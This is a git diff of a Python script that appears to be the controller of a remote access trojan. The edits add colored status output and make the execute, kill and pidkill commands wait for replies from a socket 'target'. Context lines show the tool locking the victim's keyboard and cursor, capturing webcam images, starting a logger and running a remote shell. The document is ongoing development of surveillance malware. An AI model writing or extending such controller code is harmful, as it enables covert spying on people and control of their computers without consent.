@@ -49,6 +49,7 @@ def send_format(sok, format):
     try:
         format = f"{format.strip()}\n"
         sok.sendall(format.encode())
+        recv_status(sok)
     except:
         return
 
@@ -77,10 +78,26 @@ def wrap_move_cursor(sok, command: str):
 def recv_status(_target):
     try:
         _target.settimeout(5.0)
-        print(_target.recv(1024).decode())
-        _target.settimeout(None)
+        data =_target.recv(1024)
+        color = None
+        if not data:
+            cprint("[-] Can't recv status", 'red')
+            return
+        data = data.decode()
+        if "[+]" in data:
+            color = 'green'
+        elif "[-]" in data:
+            color = 'red'
+        else:
+            color = 'white'
+        cprint(f"{data}", color)
     except:
-        cprint("[!] Can't recv status", 'yellow')
+        cprint("[-] Can't recv status", 'red')
+    finally:
+        try:
+            _target.settimeout(None)
+        except:
+            pass
 
 def start_log():
     cprint("[*] Starting logger", 'blue')
@@ -345,7 +362,7 @@ def ui(sok, cmd):
         send_format(sok, "lock keyboard")
 
     else:
-        print("use lock/unlock for cursor/keyboard event")
+        cprint("[-] Use lock/unlock for cursor/keyboard event", 'red')
         send_format(sok, "invalid")
 
 def data_diterima(_target):
@@ -484,11 +501,11 @@ def shellc(_target):
                 x += 1
                 start_image_server(save_as='webcam'+str(x)+'.jpg') 
             elif perintah[:7] == 'execute':
-                pass  
+                recv_status(_target)
             elif perintah[:4] == 'kill':
-                pass  
+                recv_status(_target)
             elif perintah[:7] == 'pidkill':
-                pass
+                recv_status(_target)
             elif perintah.startswith("move"):
                 wrap_move_cursor(_target, perintah)
             elif perintah.strip() == "rclick":
